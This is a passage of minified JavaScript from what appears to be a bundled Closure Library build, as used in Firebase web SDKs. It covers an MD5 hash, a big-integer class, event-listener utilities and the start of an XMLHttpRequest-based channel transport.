*/function e(N,T){function k(){}k.prototype=T.prototype,N.D=T.prototype,N.prototype=new k,N.prototype.constructor=N,N.C=function(I,j,z){for(var P=Array(arguments.length-2),Ne=2;Ne<arguments.length;Ne++)P[Ne-2]=arguments[Ne];return T.prototype[j].apply(I,P)}}function n(){this.blockSize=-1}function i(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.B=Array(this.blockSize),this.o=this.h=0,this.s()}e(i,n),i.prototype.s=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function s(N,T,k){k||(k=0);var I=Array(16);if(typeof T=="string")for(var j=0;16>j;++j)I[j]=T.charCodeAt(k++)|T.charCodeAt(k++)<<8|T.charCodeAt(k++)<<16|T.charCodeAt(k++)<<24;else for(j=0;16>j;++j)I[j]=T[k++]|T[k++]<<8|T[k++]<<16|T[k++]<<24;T=N.g[0],k=N.g[1],j=N.g[2];var z=N.g[3],P=T+(z^k&(j^z))+I[0]+3614090360&4294967295;T=k+(P<<7&4294967295|P>>>25),P=z+(j^T&(k^j))+I[1]+3905402710&4294967295,z=T+(P<<12&4294967295|P>>>20),P=j+(k^z&(T^k))+I[2]+606105819&4294967295,j=z+(P<<17&4294967295|P>>>15),P=k+(T^j&(z^T))+I[3]+3250441966&4294967295,k=j+(P<<22&4294967295|P>>>10),P=T+(z^k&(j^z))+I[4]+4118548399&4294967295,T=k+(P<<7&4294967295|P>>>25),P=z+(j^T&(k^j))+I[5]+1200080426&4294967295,z=T+(P<<12&4294967295|P>>>20),P=j+(k^z&(T^k))+I[6]+2821735955&4294967295,j=z+(P<<17&4294967295|P>>>15),P=k+(T^j&(z^T))+I[7]+4249261313&4294967295,k=j+(P<<22&4294967295|P>>>10),P=T+(z^k&(j^z))+I[8]+1770035416&4294967295,T=k+(P<<7&4294967295|P>>>25),P=z+(j^T&(k^j))+I[9]+2336552879&4294967295,z=T+(P<<12&4294967295|P>>>20),P=j+(k^z&(T^k))+I[10]+4294925233&4294967295,j=z+(P<<17&4294967295|P>>>15),P=k+(T^j&(z^T))+I[11]+2304563134&4294967295,k=j+(P<<22&4294967295|P>>>10),P=T+(z^k&(j^z))+I[12]+1804603682&4294967295,T=k+(P<<7&4294967295|P>>>25),P=z+(j^T&(k^j))+I[13]+4254626195&4294967295,z=T+(P<<12&4294967295|P>>>20),P=j+(k^z&(T^k))+I[14]+2792965006&4294967295,j=z+(P<<17&4294967295|P>>>15),P=k+(T^j&(z^T))+I[15]+1236535329&4294967295,k=j+(P<<22&4294967295|P>>>10),P=T+(j^z&(k^j))+I[1]+4129170786&4294967295,T=k+(P<<5&4294967295|P>>>27),P=z+(k^j&(T^k))+I[6]+3225465664&4294967295,z=T+(P<<9&4294967295|P>>>23),P=j+(T^k&(z^T))+I[11]+643717713&4294967295,j=z+(P<<14&4294967295|P>>>18),P=k+(z^T&(j^z))+I[0]+3921069994&4294967295,k=j+(P<<20&4294967295|P>>>12),P=T+(j^z&(k^j))+I[5]+3593408605&4294967295,T=k+(P<<5&4294967295|P>>>27),P=z+(k^j&(T^k))+I[10]+38016083&4294967295,z=T+(P<<9&4294967295|P>>>23),P=j+(T^k&(z^T))+I[15]+3634488961&4294967295,j=z+(P<<14&4294967295|P>>>18),P=k+(z^T&(j^z))+I[4]+3889429448&4294967295,k=j+(P<<20&4294967295|P>>>12),P=T+(j^z&(k^j))+I[9]+568446438&4294967295,T=k+(P<<5&4294967295|P>>>27),P=z+(k^j&(T^k))+I[14]+3275163606&4294967295,z=T+(P<<9&4294967295|P>>>23),P=j+(T^k&(z^T))+I[3]+4107603335&4294967295,j=z+(P<<14&4294967295|P>>>18),P=k+(z^T&(j^z))+I[8]+1163531501&4294967295,k=j+(P<<20&4294967295|P>>>12),P=T+(j^z&(k^j))+I[13]+2850285829&4294967295,T=k+(P<<5&4294967295|P>>>27),P=z+(k^j&(T^k))+I[2]+4243563512&4294967295,z=T+(P<<9&4294967295|P>>>23),P=j+(T^k&(z^T))+I[7]+1735328473&4294967295,j=z+(P<<14&4294967295|P>>>18),P=k+(z^T&(j^z))+I[12]+2368359562&4294967295,k=j+(P<<20&4294967295|P>>>12),P=T+(k^j^z)+I[5]+4294588738&4294967295,T=k+(P<<4&4294967295|P>>>28),P=z+(T^k^j)+I[8]+2272392833&4294967295,z=T+(P<<11&4294967295|P>>>21),P=j+(z^T^k)+I[11]+1839030562&4294967295,j=z+(P<<16&4294967295|P>>>16),P=k+(j^z^T)+I[14]+4259657740&4294967295,k=j+(P<<23&4294967295|P>>>9),P=T+(k^j^z)+I[1]+2763975236&4294967295,T=k+(P<<4&4294967295|P>>>28),P=z+(T^k^j)+I[4]+1272893353&4294967295,z=T+(P<<11&4294967295|P>>>21),P=j+(z^T^k)+I[7]+4139469664&4294967295,j=z+(P<<16&4294967295|P>>>16),P=k+(j^z^T)+I[10]+3200236656&4294967295,k=j+(P<<23&4294967295|P>>>9),P=T+(k^j^z)+I[13]+681279174&4294967295,T=k+(P<<4&4294967295|P>>>28),P=z+(T^k^j)+I[0]+3936430074&4294967295,z=T+(P<<11&4294967295|P>>>21),P=j+(z^T^k)+I[3]+3572445317&4294967295,j=z+(P<<16&4294967295|P>>>16),P=k+(j^z^T)+I[6]+76029189&4294967295,k=j+(P<<23&4294967295|P>>>9),P=T+(k^j^z)+I[9]+3654602809&4294967295,T=k+(P<<4&4294967295|P>>>28),P=z+(T^k^j)+I[12]+3873151461&4294967295,z=T+(P<<11&4294967295|P>>>21),P=j+(z^T^k)+I[15]+530742520&4294967295,j=z+(P<<16&4294967295|P>>>16),P=k+(j^z^T)+I[2]+3299628645&4294967295,k=j+(P<<23&4294967295|P>>>9),P=T+(j^(k|~z))+I[0]+4096336452&4294967295,T=k+(P<<6&4294967295|P>>>26),P=z+(k^(T|~j))+I[7]+1126891415&4294967295,z=T+(P<<10&4294967295|P>>>22),P=j+(T^(z|~k))+I[14]+2878612391&4294967295,j=z+(P<<15&4294967295|P>>>17),P=k+(z^(j|~T))+I[5]+4237533241&4294967295,k=j+(P<<21&4294967295|P>>>11),P=T+(j^(k|~z))+I[12]+1700485571&4294967295,T=k+(P<<6&4294967295|P>>>26),P=z+(k^(T|~j))+I[3]+2399980690&4294967295,z=T+(P<<10&4294967295|P>>>22),P=j+(T^(z|~k))+I[10]+4293915773&4294967295,j=z+(P<<15&4294967295|P>>>17),P=k+(z^(j|~T))+I[1]+2240044497&4294967295,k=j+(P<<21&4294967295|P>>>11),P=T+(j^(k|~z))+I[8]+1873313359&4294967295,T=k+(P<<6&4294967295|P>>>26),P=z+(k^(T|~j))+I[15]+4264355552&4294967295,z=T+(P<<10&4294967295|P>>>22),P=j+(T^(z|~k))+I[6]+2734768916&4294967295,j=z+(P<<15&4294967295|P>>>17),P=k+(z^(j|~T))+I[13]+1309151649&4294967295,k=j+(P<<21&4294967295|P>>>11),P=T+(j^(k|~z))+I[4]+4149444226&4294967295,T=k+(P<<6&4294967295|P>>>26),P=z+(k^(T|~j))+I[11]+3174756917&4294967295,z=T+(P<<10&4294967295|P>>>22),P=j+(T^(z|~k))+I[2]+718787259&4294967295,j=z+(P<<15&4294967295|P>>>17),P=k+(z^(j|~T))+I[9]+3951481745&4294967295,N.g[0]=N.g[0]+T&4294967295,N.g[1]=N.g[1]+(j+(P<<21&4294967295|P>>>11))&4294967295,N.g[2]=N.g[2]+j&4294967295,N.g[3]=N.g[3]+z&4294967295}i.prototype.u=function(N,T){T===void 0&&(T=N.length);for(var k=T-this.blockSize,I=this.B,j=this.h,z=0;z<T;){if(j==0)for(;z<=k;)s(this,N,z),z+=this.blockSize;if(typeof N=="string"){for(;z<T;)if(I[j++]=N.charCodeAt(z++),j==this.blockSize){s(this,I),j=0;break}}else for(;z<T;)if(I[j++]=N[z++],j==this.blockSize){s(this,I),j=0;break}}this.h=j,this.o+=T},i.prototype.v=function(){var N=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);N[0]=128;for(var T=1;T<N.length-8;++T)N[T]=0;var k=8*this.o;for(T=N.length-8;T<N.length;++T)N[T]=k&255,k/=256;for(this.u(N),N=Array(16),T=k=0;4>T;++T)for(var I=0;32>I;I+=8)N[k++]=this.g[T]>>>I&255;return N};function o(N,T){var k=d;return Object.prototype.hasOwnProperty.call(k,N)?k[N]:k[N]=T(N)}function c(N,T){this.h=T;for(var k=[],I=!0,j=N.length-1;0<=j;j--){var z=N[j]|0;I&&z==T||(k[j]=z,I=!1)}this.g=k}var d={};function f(N){return-128<=N&&128>N?o(N,function(T){return new c([T|0],0>T?-1:0)}):new c([N|0],0>N?-1:0)}function p(N){if(isNaN(N)||!isFinite(N))return b;if(0>N)return V(p(-N));for(var T=[],k=1,I=0;N>=k;I++)T[I]=N/k|0,k*=4294967296;return new c(T,0)}function v(N,T){if(N.length==0)throw Error("number format error: empty string");if(T=T||10,2>T||36<T)throw Error("radix out of range: "+T);if(N.charAt(0)=="-")return V(v(N.substring(1),T));if(0<=N.indexOf("-"))throw Error('number format error: interior "-" character');for(var k=p(Math.pow(T,8)),I=b,j=0;j<N.length;j+=8){var z=Math.min(8,N.length-j),P=parseInt(N.substring(j,j+z),T);8>z?(z=p(Math.pow(T,z)),I=I.j(z).add(p(P))):(I=I.j(k),I=I.add(p(P)))}return I}var b=f(0),w=f(1),E=f(16777216);t=c.prototype,t.m=function(){if(M(this))return-V(this).m();for(var N=0,T=1,k=0;k<this.g.length;k++){var I=this.i(k);N+=(0<=I?I:4294967296+I)*T,T*=4294967296}return N},t.toString=function(N){if(N=N||10,2>N||36<N)throw Error("radix out of range: "+N);if(C(this))return"0";if(M(this))return"-"+V(this).toString(N);for(var T=p(Math.pow(N,6)),k=this,I="";;){var j=Q(k,T).g;k=B(k,j.j(T));var z=((0<k.g.length?k.g[0]:k.h)>>>0).toString(N);if(k=j,C(k))return z+I;for(;6>z.length;)z="0"+z;I=z+I}},t.i=function(N){return 0>N?0:N<this.g.length?this.g[N]:this.h};function C(N){if(N.h!=0)return!1;for(var T=0;T<N.g.length;T++)if(N.g[T]!=0)return!1;return!0}function M(N){return N.h==-1}t.l=function(N){return N=B(this,N),M(N)?-1:C(N)?0:1};function V(N){for(var T=N.g.length,k=[],I=0;I<T;I++)k[I]=~N.g[I];return new c(k,~N.h).add(w)}t.abs=function(){return M(this)?V(this):this},t.add=function(N){for(var T=Math.max(this.g.length,N.g.length),k=[],I=0,j=0;j<=T;j++){var z=I+(this.i(j)&65535)+(N.i(j)&65535),P=(z>>>16)+(this.i(j)>>>16)+(N.i(j)>>>16);I=P>>>16,z&=65535,P&=65535,k[j]=P<<16|z}return new c(k,k[k.length-1]&-2147483648?-1:0)};function B(N,T){return N.add(V(T))}t.j=function(N){if(C(this)||C(N))return b;if(M(this))return M(N)?V(this).j(V(N)):V(V(this).j(N));if(M(N))return V(this.j(V(N)));if(0>this.l(E)&&0>N.l(E))return p(this.m()*N.m());for(var T=this.g.length+N.g.length,k=[],I=0;I<2*T;I++)k[I]=0;for(I=0;I<this.g.length;I++)for(var j=0;j<N.g.length;j++){var z=this.i(I)>>>16,P=this.i(I)&65535,Ne=N.i(j)>>>16,Me=N.i(j)&65535;k[2*I+2*j]+=P*Me,Y(k,2*I+2*j),k[2*I+2*j+1]+=z*Me,Y(k,2*I+2*j+1),k[2*I+2*j+1]+=P*Ne,Y(k,2*I+2*j+1),k[2*I+2*j+2]+=z*Ne,Y(k,2*I+2*j+2)}for(I=0;I<T;I++)k[I]=k[2*I+1]<<16|k[2*I];for(I=T;I<2*T;I++)k[I]=0;return new c(k,0)};function Y(N,T){for(;(N[T]&65535)!=N[T];)N[T+1]+=N[T]>>>16,N[T]&=65535,T++}function D(N,T){this.g=N,this.h=T}function Q(N,T){if(C(T))throw Error("division by zero");if(C(N))return new D(b,b);if(M(N))return T=Q(V(N),T),new D(V(T.g),V(T.h));if(M(T))return T=Q(N,V(T)),new D(V(T.g),T.h);if(30<N.g.length){if(M(N)||M(T))throw Error("slowDivide_ only works with positive integers.");for(var k=w,I=T;0>=I.l(N);)k=G(k),I=G(I);var j=L(k,1),z=L(I,1);for(I=L(I,2),k=L(k,2);!C(I);){var P=z.add(I);0>=P.l(N)&&(j=j.add(k),z=P),I=L(I,1),k=L(k,1)}return T=B(N,j.j(T)),new D(j,T)}for(j=b;0<=N.l(T);){for(k=Math.max(1,Math.floor(N.m()/T.m())),I=Math.ceil(Math.log(k)/Math.LN2),I=48>=I?1:Math.pow(2,I-48),z=p(k),P=z.j(T);M(P)||0<P.l(N);)k-=I,z=p(k),P=z.j(T);C(z)&&(z=w),j=j.add(z),N=B(N,P)}return new D(j,N)}t.A=function(N){return Q(this,N).h},t.and=function(N){for(var T=Math.max(this.g.length,N.g.length),k=[],I=0;I<T;I++)k[I]=this.i(I)&N.i(I);return new c(k,this.h&N.h)},t.or=function(N){for(var T=Math.max(this.g.length,N.g.length),k=[],I=0;I<T;I++)k[I]=this.i(I)|N.i(I);return new c(k,this.h|N.h)},t.xor=function(N){for(var T=Math.max(this.g.length,N.g.length),k=[],I=0;I<T;I++)k[I]=this.i(I)^N.i(I);return new c(k,this.h^N.h)};function G(N){for(var T=N.g.length+1,k=[],I=0;I<T;I++)k[I]=N.i(I)<<1|N.i(I-1)>>>31;return new c(k,N.h)}function L(N,T){var k=T>>5;T%=32;for(var I=N.g.length-k,j=[],z=0;z<I;z++)j[z]=0<T?N.i(z+k)>>>T|N.i(z+k+1)<<32-T:N.i(z+k);return new c(j,N.h)}i.prototype.digest=i.prototype.v,i.prototype.reset=i.prototype.s,i.prototype.update=i.prototype.u,FC=i,c.prototype.add=c.prototype.add,c.prototype.multiply=c.prototype.j,c.prototype.modulo=c.prototype.A,c.prototype.compare=c.prototype.l,c.prototype.toNumber=c.prototype.m,c.prototype.toString=c.prototype.toString,c.prototype.getBits=c.prototype.i,c.fromNumber=p,c.fromString=v,Pa=c}).apply(typeof Zx<"u"?Zx:typeof self<"u"?self:typeof window<"u"?window:{});var Ef=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var HC,ed,qC,Lf,P0,GC,YC,QC;(function(){var t,e=typeof Object.defineProperties=="function"?Object.defineProperty:function(h,_,x){return h==Array.prototype||h==Object.prototype||(h[_]=x.value),h};function n(h){h=[typeof globalThis=="object"&&globalThis,h,typeof window=="object"&&window,typeof self=="object"&&self,typeof Ef=="object"&&Ef];for(var _=0;_<h.length;++_){var x=h[_];if(x&&x.Math==Math)return x}throw Error("Cannot find global object")}var i=n(this);function s(h,_){if(_)e:{var x=i;h=h.split(".");for(var R=0;R<h.length-1;R++){var $=h[R];if(!($ in x))break e;x=x[$]}h=h[h.length-1],R=x[h],_=_(R),_!=R&&_!=null&&e(x,h,{configurable:!0,writable:!0,value:_})}}function o(h,_){h instanceof String&&(h+="");var x=0,R=!1,$={next:function(){if(!R&&x<h.length){var ie=x++;return{value:_(ie,h[ie]),done:!1}}return R=!0,{done:!0,value:void 0}}};return $[Symbol.iterator]=function(){return $},$}s("Array.prototype.values",function(h){return h||function(){return o(this,function(_,x){return x})}});/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/var c=c||{},d=this||self;function f(h){var _=typeof h;return _=_!="object"?_:h?Array.isArray(h)?"array":_:"null",_=="array"||_=="object"&&typeof h.length=="number"}function p(h){var _=typeof h;return _=="object"&&h!=null||_=="function"}function v(h,_,x){return h.call.apply(h.bind,arguments)}function b(h,_,x){if(!h)throw Error();if(2<arguments.length){var R=Array.prototype.slice.call(arguments,2);return function(){var $=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply($,R),h.apply(_,$)}}return function(){return h.apply(_,arguments)}}function w(h,_,x){return w=Function.prototype.bind&&Function.prototype.bind.toString().indexOf("native code")!=-1?v:b,w.apply(null,arguments)}function E(h,_){var x=Array.prototype.slice.call(arguments,1);return function(){var R=x.slice();return R.push.apply(R,arguments),h.apply(this,R)}}function C(h,_){function x(){}x.prototype=_.prototype,h.aa=_.prototype,h.prototype=new x,h.prototype.constructor=h,h.Qb=function(R,$,ie){for(var ve=Array(arguments.length-2),dt=2;dt<arguments.length;dt++)ve[dt-2]=arguments[dt];return _.prototype[$].apply(R,ve)}}function M(h){const _=h.length;if(0<_){const x=Array(_);for(let R=0;R<_;R++)x[R]=h[R];return x}return[]}function V(h,_){for(let x=1;x<arguments.length;x++){const R=arguments[x];if(f(R)){const $=h.length||0,ie=R.length||0;h.length=$+ie;for(let ve=0;ve<ie;ve++)h[$+ve]=R[ve]}else h.push(R)}}class B{constructor(_,x){this.i=_,this.j=x,this.h=0,this.g=null}get(){let _;return 0<this.h?(this.h--,_=this.g,this.g=_.next,_.next=null):_=this.i(),_}}function Y(h){return/^[\s\xa0]*$/.test(h)}function D(){var h=d.navigator;return h&&(h=h.userAgent)?h:""}function Q(h){return Q[" "](h),h}Q[" "]=function(){};var G=D().indexOf("Gecko")!=-1&&!(D().toLowerCase().indexOf("webkit")!=-1&&D().indexOf("Edge")==-1)&&!(D().indexOf("Trident")!=-1||D().indexOf("MSIE")!=-1)&&D().indexOf("Edge")==-1;function L(h,_,x){for(const R in h)_.call(x,h[R],R,h)}function N(h,_){for(const x in h)_.call(void 0,h[x],x,h)}function T(h){const _={};for(const x in h)_[x]=h[x];return _}const k="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function I(h,_){let x,R;for(let $=1;$<arguments.length;$++){R=arguments[$];for(x in R)h[x]=R[x];for(let ie=0;ie<k.length;ie++)x=k[ie],Object.prototype.hasOwnProperty.call(R,x)&&(h[x]=R[x])}}function j(h){var _=1;h=h.split(":");const x=[];for(;0<_&&h.length;)x.push(h.shift()),_--;return h.length&&x.push(h.join(":")),x}function z(h){d.setTimeout(()=>{throw h},0)}function P(){var h=Be;let _=null;return h.g&&(_=h.g,h.g=h.g.next,h.g||(h.h=null),_.next=null),_}class Ne{constructor(){this.h=this.g=null}add(_,x){const R=Me.get();R.set(_,x),this.h?this.h.next=R:this.g=R,this.h=R}}var Me=new B(()=>new ee,h=>h.reset());class ee{constructor(){this.next=this.g=this.h=null}set(_,x){this.h=_,this.g=x,this.next=null}reset(){this.next=this.g=this.h=null}}let me,we=!1,Be=new Ne,F=()=>{const h=d.Promise.resolve(void 0);me=()=>{h.then(ae)}};var ae=()=>{for(var h;h=P();){try{h.h.call(h.g)}catch(x){z(x)}var _=Me;_.j(h),100>_.h&&(_.h++,h.next=_.g,_.g=h)}we=!1};function ge(){this.s=this.s,this.C=this.C}ge.prototype.s=!1,ge.prototype.ma=function(){this.s||(this.s=!0,this.N())},ge.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function ue(h,_){this.type=h,this.g=this.target=_,this.defaultPrevented=!1}ue.prototype.h=function(){this.defaultPrevented=!0};var Te=function(){if(!d.addEventListener||!Object.defineProperty)return!1;var h=!1,_=Object.defineProperty({},"passive",{get:function(){h=!0}});try{const x=()=>{};d.addEventListener("test",x,_),d.removeEventListener("test",x,_)}catch{}return h}();function _e(h,_){if(ue.call(this,h?h.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,h){var x=this.type=h.type,R=h.changedTouches&&h.changedTouches.length?h.changedTouches[0]:null;if(this.target=h.target||h.srcElement,this.g=_,_=h.relatedTarget){if(G){e:{try{Q(_.nodeName);var $=!0;break e}catch{}$=!1}$||(_=null)}}else x=="mouseover"?_=h.fromElement:x=="mouseout"&&(_=h.toElement);this.relatedTarget=_,R?(this.clientX=R.clientX!==void 0?R.clientX:R.pageX,this.clientY=R.clientY!==void 0?R.clientY:R.pageY,this.screenX=R.screenX||0,this.screenY=R.screenY||0):(this.clientX=h.clientX!==void 0?h.clientX:h.pageX,this.clientY=h.clientY!==void 0?h.clientY:h.pageY,this.screenX=h.screenX||0,this.screenY=h.screenY||0),this.button=h.button,this.key=h.key||"",this.ctrlKey=h.ctrlKey,this.altKey=h.altKey,this.shiftKey=h.shiftKey,this.metaKey=h.metaKey,this.pointerId=h.pointerId||0,this.pointerType=typeof h.pointerType=="string"?h.pointerType:he[h.pointerType]||"",this.state=h.state,this.i=h,h.defaultPrevented&&_e.aa.h.call(this)}}C(_e,ue);var he={2:"touch",3:"pen",4:"mouse"};_e.prototype.h=function(){_e.aa.h.call(this);var h=this.i;h.preventDefault?h.preventDefault():h.returnValue=!1};var it="closure_listenable_"+(1e6*Math.random()|0),gt=0;function xi(h,_,x,R,$){this.listener=h,this.proxy=null,this.src=_,this.type=x,this.capture=!!R,this.ha=$,this.key=++gt,this.da=this.fa=!1}function Ft(h){h.da=!0,h.listener=null,h.proxy=null,h.src=null,h.ha=null}function Fn(h){this.src=h,this.g={},this.h=0}Fn.prototype.add=function(h,_,x,R,$){var ie=h.toString();h=this.g[ie],h||(h=this.g[ie]=[],this.h++);var ve=is(h,_,R,$);return-1<ve?(_=h[ve],x||(_.fa=!1)):(_=new xi(_,this.src,ie,!!R,$),_.fa=x,h.push(_)),_};function Er(h,_){var x=_.type;if(x in h.g){var R=h.g[x],$=Array.prototype.indexOf.call(R,_,void 0),ie;(ie=0<=$)&&Array.prototype.splice.call(R,$,1),ie&&(Ft(_),h.g[x].length==0&&(delete h.g[x],h.h--))}}function is(h,_,x,R){for(var $=0;$<h.length;++$){var ie=h[$];if(!ie.da&&ie.listener==_&&ie.capture==!!x&&ie.ha==R)return $}return-1}var Zn="closure_lm_"+(1e6*Math.random()|0),Ja={};function al(h,_,x,R,$){if(Array.isArray(_)){for(var ie=0;ie<_.length;ie++)al(h,_[ie],x,R,$);return null}return x=Ws(x),h&&h[it]?h.K(_,x,p(R)?!!R.capture:!1,$):Jn(h,_,x,!1,R,$)}function Jn(h,_,x,R,$,ie){if(!_)throw Error("Invalid event type");var ve=p($)?!!$.capture:!!$,dt=Bi(h);if(dt||(h[Zn]=dt=new Fn(h)),x=dt.add(_,x,R,ve,ie),x.proxy)return x;if(R=qc(),x.proxy=R,R.src=h,R.listener=x,h.addEventListener)Te||($=ve),$===void 0&&($=!1),h.addEventListener(_.toString(),R,$);else if(h.attachEvent)h.attachEvent(rs(_.toString()),R);else if(h.addListener&&h.removeListener)h.addListener(R);else throw Error("addEventListener and attachEvent are unavailable.");return x}function qc(){function h(x){return _.call(h.src,h.listener,x)}const _=ur;return h}function eo(h,_,x,R,$){if(Array.isArray(_))for(var ie=0;ie<_.length;ie++)eo(h,_[ie],x,R,$);else R=p(R)?!!R.capture:!!R,x=Ws(x),h&&h[it]?(h=h.i,_=String(_).toString(),_ in h.g&&(ie=h.g[_],x=is(ie,x,R,$),-1<x&&(Ft(ie[x]),Array.prototype.splice.call(ie,x,1),ie.length==0&&(delete h.g[_],h.h--)))):h&&(h=Bi(h))&&(_=h.g[_.toString()],h=-1,_&&(h=is(_,x,R,$)),(x=-1<h?_[h]:null)&&Qs(x))}function Qs(h){if(typeof h!="number"&&h&&!h.da){var _=h.src;if(_&&_[it])Er(_.i,h);else{var x=h.type,R=h.proxy;_.removeEventListener?_.removeEventListener(x,R,h.capture):_.detachEvent?_.detachEvent(rs(x),R):_.addListener&&_.removeListener&&_.removeListener(R),(x=Bi(_))?(Er(x,h),x.h==0&&(x.src=null,_[Zn]=null)):Ft(h)}}}function rs(h){return h in Ja?Ja[h]:Ja[h]="on"+h}function ur(h,_){if(h.da)h=!0;else{_=new _e(_,this);var x=h.listener,R=h.ha||h.src;h.fa&&Qs(h),h=x.call(R,_)}return h}function Bi(h){return h=h[Zn],h instanceof Fn?h:null}var Ks="__closure_events_fn_"+(1e9*Math.random()>>>0);function Ws(h){return typeof h=="function"?h:(h[Ks]||(h[Ks]=function(_){return h.handleEvent(_)}),h[Ks])}function bt(){ge.call(this),this.i=new Fn(this),this.M=this,this.F=null}C(bt,ge),bt.prototype[it]=!0,bt.prototype.removeEventListener=function(h,_,x,R){eo(this,h,_,x,R)};function We(h,_){var x,R=h.F;if(R)for(x=[];R;R=R.F)x.push(R);if(h=h.M,R=_.type||_,typeof _=="string")_=new ue(_,h);else if(_ instanceof ue)_.target=_.target||h;else{var $=_;_=new ue(R,h),I(_,$)}if($=!0,x)for(var ie=x.length-1;0<=ie;ie--){var ve=_.g=x[ie];$=Hn(ve,R,!0,_)&&$}if(ve=_.g=h,$=Hn(ve,R,!0,_)&&$,$=Hn(ve,R,!1,_)&&$,x)for(ie=0;ie<x.length;ie++)ve=_.g=x[ie],$=Hn(ve,R,!1,_)&&$}bt.prototype.N=function(){if(bt.aa.N.call(this),this.i){var h=this.i,_;for(_ in h.g){for(var x=h.g[_],R=0;R<x.length;R++)Ft(x[R]);delete h.g[_],h.h--}}this.F=null},bt.prototype.K=function(h,_,x,R){return this.i.add(String(h),_,!1,x,R)},bt.prototype.L=function(h,_,x,R){return this.i.add(String(h),_,!0,x,R)};function Hn(h,_,x,R){if(_=h.i.g[String(_)],!_)return!0;_=_.concat();for(var $=!0,ie=0;ie<_.length;++ie){var ve=_[ie];if(ve&&!ve.da&&ve.capture==x){var dt=ve.listener,hn=ve.ha||ve.src;ve.fa&&Er(h.i,ve),$=dt.call(hn,R)!==!1&&$}}return $&&!R.defaultPrevented}function rn(h,_,x){if(typeof h=="function")x&&(h=w(h,x));else if(h&&typeof h.handleEvent=="function")h=w(h.handleEvent,h);else throw Error("Invalid listener argument");return 2147483647<Number(_)?-1:d.setTimeout(h,_||0)}function ol(h){h.g=rn(()=>{h.g=null,h.i&&(h.i=!1,ol(h))},h.l);const _=h.h;h.h=null,h.m.apply(null,_)}class zi extends ge{constructor(_,x){super(),this.m=_,this.l=x,this.h=null,this.i=!1,this.g=null}j(_){this.h=arguments,this.g?this.i=!0:ol(this)}N(){super.N(),this.g&&(d.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function Tr(h){ge.call(this),this.h=h,this.g={}}C(Tr,ge);var Cr=[];function Sr(h){L(h.g,function(_,x){this.g.hasOwnProperty(x)&&Qs(_)},h),h.g={}}Tr.prototype.N=function(){Tr.aa.N.call(this),Sr(this)},Tr.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var Ai=d.JSON.stringify,ss=d.JSON.parse,Fi=class{stringify(h){return d.JSON.stringify(h,void 0)}parse(h){return d.JSON.parse(h,void 0)}};function $s(){}$s.prototype.h=null;function as(h){return h.h||(h.h=h.i())}function to(){}var Hi={OPEN:"a",kb:"b",Ja:"c",wb:"d"};function dr(){ue.call(this,"d")}C(dr,ue);function Xs(){ue.call(this,"c")}C(Xs,ue);var ei={},Nr=null;function Rr(){return Nr=Nr||new bt}ei.La="serverreachability";function Zs(h){ue.call(this,ei.La,h)}C(Zs,ue);function H(h){const _=Rr();We(_,new Zs(_))}ei.STAT_EVENT="statevent";function W(h,_){ue.call(this,ei.STAT_EVENT,h),this.stat=_}C(W,ue);function Z(h){const _=Rr();We(_,new W(_,h))}ei.Ma="timingevent";function le(h,_){ue.call(this,ei.Ma,h),this.size=_}C(le,ue);function pe(h,_){if(typeof h!="function")throw Error("Fn must not be null and must be a function");return d.setTimeout(function(){h()},_)}function be(){this.g=!0}be.prototype.xa=function(){this.g=!1};function De(h,_,x,R,$,ie){h.info(function(){if(h.g)if(ie)for(var ve="",dt=ie.split("&"),hn=0;hn<dt.length;hn++){var ht=dt[hn].split("=");if(1<ht.length){var wn=ht[0];ht=ht[1];var fn=wn.split("_");ve=2<=fn.length&&fn[1]=="type"?ve+(wn+"="+ht+"&"):ve+(wn+"=redacted&")}}else ve=null;else ve=ie;return"XMLHTTP REQ ("+R+") [attempt "+$+"]: "+_+`
`+x+`
`+ve})}function Ae(h,_,x,R,$,ie,ve){h.info(function(){return"XMLHTTP RESP ("+R+") [ attempt "+$+"]: "+_+`
`+x+`
`+ie+" "+ve})}function Ce(h,_,x,R){h.info(function(){return"XMLHTTP TEXT ("+_+"): "+je(h,x)+(R?" "+R:"")})}function Re(h,_){h.info(function(){return"TIMEOUT: "+_})}be.prototype.info=function(){};function je(h,_){if(!h.g)return _;if(!_)return null;try{var x=JSON.parse(_);if(x){for(h=0;h<x.length;h++)if(Array.isArray(x[h])){var R=x[h];if(!(2>R.length)){var $=R[1];if(Array.isArray($)&&!(1>$.length)){var ie=$[0];if(ie!="noop"&&ie!="stop"&&ie!="close")for(var ve=1;ve<$.length;ve++)$[ve]=""}}}}return Ai(x)}catch{return _}}var Se={NO_ERROR:0,gb:1,tb:2,sb:3,nb:4,rb:5,ub:6,Ia:7,TIMEOUT:8,xb:9},Ve={lb:"complete",Hb:"success",Ja:"error",Ia:"abort",zb:"ready",Ab:"readystatechange",TIMEOUT:"timeout",vb:"incrementaldata",yb:"progress",ob:"downloadprogress",Pb:"uploadprogress"},rt;function Tt(){}C(Tt,$s),Tt.prototype.g=function(){return new XMLHttpRequest},Tt.prototype.i=function(){return{}},rt=new Tt;function yt(h,_,x,R){this.j=h,this.i=_,this.l=x,this.R=R||1,this.U=new Tr(this),this.I=45e3,this.H=null,this.o=!1,this.m=this.A=this.v=this.L=this.F=this.S=this.B=null,this.D=[],this.g=null,this.C=0,this.s=this.u=null,this.X=-1,this.J=!1,this.O=0,this.M=null,this.W=this.K=this.T=this.P=!1,this.h=new ut}function ut(){this.i=null,this.g="",this.h=!1}var Ze={},qi={};function dn(h,_,x){h.L=1,h.v=ro(Ci(_)),h.m=x,h.P=!0,ti(h,null)}function ti(h,_){h.F=Date.now(),Ei(h),h.A=Ci(h.v);var 